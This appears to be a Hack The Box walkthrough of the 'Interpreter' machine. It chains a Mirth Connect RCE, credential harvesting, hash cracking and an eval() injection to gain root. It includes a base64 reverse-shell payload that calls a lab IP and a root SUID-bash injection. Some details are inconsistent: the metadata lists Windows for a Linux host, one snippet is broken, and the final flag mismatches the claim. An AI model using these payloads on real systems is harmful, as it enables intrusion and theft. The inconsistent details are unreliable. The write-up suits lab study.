---
title: "Interpreter"
description: "This report documents the successful penetration test of the Interpreter HTB machine. Critical vulnerabilities were identified that allowed for complete system compromise, from…"
date: 2026-02-09
platform: "Hack The Box"
os: "Windows"
difficulty: "Medium"
tags: ["walkthrough", "htb", "active"]
cover: ../../assets/images/interpreter-htb.png
coverAlt: "Interpreter HTB"
---
## **Executive Summary**
This report documents the successful penetration test of the Interpreter HTB machine. Critical vulnerabilities were identified that allowed for complete system compromise, from initial access through privilege escalation to root.
Nmap Scan

| **Phase**                | **Details**                                                                                                             |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------- |
| **Initial Access**       | **CVE-2023-43208**: Unauthenticated RCE in Mirth Connect via XML Marshalling.                                           |
| **User Pivot**           | **Database Credential Harvesting**: Found `mirthdb` credentials in `mirth.properties` to dump the `PERSON` table.       |
| **Credential Cracking**  | **JtR/Hashcat**: Cracked **sedric's** SHA-256 hash using the `keystore.storepass` found in the config as a global salt. |
| **Privilege Escalation** | Python F-String eval() Injection                                                                                        |
| **Final Flag**           | `root.txt` captured.                                                                                                    |
|                          |                                                                                                                         |
### Initial Reconnaissance
#### Port Scanning

```bash
sudo nmap -p- --min-rate 5000 -v 10.129.2.173 
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
6661/tcp open  unknown
 
```

```bash
 sudo nmap -sV -sC -p 22,80,443,6661 10.129.2.173 -Pn -T3 --max-retries 1
 
 PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
443/tcp  open  ssl/http Jetty
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
6661/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
###  Initial Access CVE-2023-43208 Mirth Connect RCE
![Image](../../assets/images/Pasted-image-20260221202647.png)

The target was running Mirth Connect v4.4.0, which is vulnerable to CVE-2023-43208  pre-authenticated remote code execution vulnerability. The detection script confirmed the version:
https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc

```bash
python3 detection.py https://10.129.2.173/webadmin/                           
Server version: 4.4.0
Vulnerable to CVE-2023-43208.

```
A reverse shell was obtained by sending a base64-encoded bash payload through the exploit:
```bash
python3 CVE-2023-43208.py -u https://10.129.2.224:443 -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMy80NDQ1IDA+JjEK}|{base64,-d}|{bash,-i}"

 nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.10.16.33] from (UNKNOWN) [10.129.2.224] 45082
bash: cannot set terminal process group (3514): Inappropriate ioctl for device
bash: no job control in this shell
mirth@interpreter:/usr/local/mirthconnect$ 

```

### Credential Discovery
Reviewing `mirth.properties` revealed cleartext database credentials:
```bash
mirth@interpreter:/usr/local/mirthconnect$ whoami
whoami
mirth
mirth@interpreter:/usr/local/mirthconnect$ 

```
```bash
mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties

# database credentials
database.username = mirthdb
database.password = MirthPass123!


```

#### MariaDB Enumeration
The production database was queried to extract the user password hash:

```bash
mirth@interpreter:/usr/local/mirthconnect$ mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "SELECT * FROM PERSON_PASSWORD\G"
*************************** 1. row ***************************
    PERSON_ID: 2
     PASSWORD: u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
PASSWORD_DATE: 2025-09-19 09:22:28
mirth@interpreter:/usr/local/mirthconnect$ mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod -e "SELECT p.USERNAME, pp.PASSWORD FROM PERSON p JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;"
+----------+----------------------------------------------------------+
| USERNAME | PASSWORD                                                 |
+----------+----------------------------------------------------------+
| sedric   | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |
+----------+----------------------------------------------------------+
mirth@interpreter:/usr/local/mirthconnect$ 

```
#### Hash Analysis & Cracking
By analysing the Mirth Connect JAR files (`DefaultUserController.class` and the `Digester` library), the hashing parameters were identified as PBKDF2-HMAC-SHA256 with 600,000 iterations and an 8-byte embedded salt. The hash was split and formatted for Hashcat:

### Identifying the Iteration Count via Bytecode Analysis
Standard tools such as `jar` and `unzip` were not available on the target. Python's `zipfile` module was used instead to extract the `Digester.class` file directly from `mirth-crypto.jar`:

```bash
python3 -c " import zipfile z = zipfile.ZipFile('/usr/local/mirthconnect/server-lib/mirth-crypto.jar') data = z.read('com/mirth/commons/encryption/Digester.class') open('/tmp/MirthDigester.class','wb').write(data) " strings /tmp/MirthDigester.class
```
The strings output confirmed the algorithm as PBKDF2WithHmacSHA256 and revealed the constant names DEFAULT_ITERATIONS, DEFAULT_SALT_SIZE, and DEFAULT_KEY_SIZE_BITS. To extract the actual numeric value, the raw bytecode was searched for the hex representation of 600,000 (0x000927C0)
```shell
python3 -c "
import zipfile
z = zipfile.ZipFile('/usr/local/mirthconnect/server-lib/mirth-crypto.jar')
data = z.read('com/mirth/commons/encryption/Digester.class')
print(data.hex())
"
3000927c009000
```
The pattern 0x000927C0 was found in the bytecode, confirming that 600,000 is hardcoded as the default iteration count in Mirth Connect v4.4.0. This value was then used to correctly format the hash for Hashcat mode 10900.
```bash
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = base64.b64encode(data[:8]).decode()
hash_ = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash_}')
```

```bash
hashcat -m 10900 /home/penguin/hash.txt /usr/share/wordlists/rockyou.txt --force

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1

```
Recovered credentials: sedric : snowflake1
SSH login yielded the user flag: 206a8b1a80a5440c0b6ac7c7ef76a369
```bash
sedric@interpreter:~$ ls
user.txt

```

### Privilege escalation
Process enumeration revealed a Python notification server running as root
```bash
sedric@interpreter:~$ ps aux | grep root

root        3512  0.0  0.6 401236 26156 ?        Ssl  16:46   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
root        3515  0.0  0.8  39872 32116 ?        Ss   16:46   0:01 /usr/bin/python3 /usr/local/bin/notif.py

```
The script is a Flask application listening on `127.0.0.1:54321`. It accepts XML patient data and generates formatted notifications. The `template()` function contains a critical vulnerability user-supplied fields are interpolated directly into a Python f-string which is then passed to `eval()`:

```bash
edric@interpreter:~$ cat /usr/local/bin/notif.py
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)

```

The application accepts user-supplied XML data and inserts fields directly into a Python f-string template, which is then passed to `eval()`:
Since the process runs as root, this executed the script as root, setting the SUID bit on `/bin/bash`
```bash
sedric@interpreter:~$ python3 -c "
import urllib.request
data = b'''<patient>
  <firstname>{__import__(\"os\").popen(\"/tmp/x.sh\").read()}</firstname>
  <lastname>b</lastname>
  <sender_app>c</sender_app>
  <timestamp>d</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>'''
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=data, headers={'Content-Type':'application/xml'})
print(urllib.request.urlopen(req).read())
"
b'Patient  b (M), 26 years old, received from c at d'

```
eval() executes a string as live Python code rather than treating it as plain text. When user-supplied input is embedded into a string that is then passed to eval(), any Python expression inside curly braces {} gets executed. In this case, the firstname field was injected with {__import__("os").popen("/tmp/x.sh").read()}, which the server evaluated as a real OS command running as root.
```bash
sedric@interpreter:~$ ls -la /bin/bash
/bin/bash -p
whoami
-rwsr-xr-x 1 root root 1265648 Sep  6 18:07 /bin/bash
```
The `eval()` injection gave us code execution as root, but only for the duration of that single request. To gain a persistent root shell, the SUID bit was set on `/bin/bash` using that one moment of root access. SUID is a Linux permission that causes an executable to run as its owner rather than the user who launched it. Since `/bin/bash` is owned by root, any user can run `/bin/bash -p` and receive a root shell. The `-p` flag is required to preserve the elevated privileges, as bash drops them by default without it.
```bash
bash-5.2# cat user.txt
206a8b1a80a5440c0b6ac7c7ef76a369

```
